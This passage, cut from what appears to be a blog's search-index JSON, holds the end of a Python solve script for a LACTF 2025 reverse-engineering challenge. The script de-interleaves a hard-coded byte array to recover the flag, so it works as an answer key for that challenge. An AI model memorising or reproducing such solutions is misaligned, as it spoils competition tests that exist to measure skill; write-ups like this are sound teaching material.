0x5F, 0x5F, 0x69, 0x66, 0x6E, 0x6C, 0x66, 0x61, 0x69, 0x67, 0x6E, 0x5F, 0x69, 0x67, 0x74, 0x6F, 0x79, 0x74, 0x7D, 0x00]# 转成字符串target = &quot;&quot;.join(chr(b) for b in target_bytes)# 反交织first_half = target[::2]second_half = target[1::2]flag = first_half + second_halfprint(flag)\n\n","categories":["网络安全","CTF","LACTF2025","REVERSE"],"tags":["REVERSE","比赛题目","海外比赛"]}]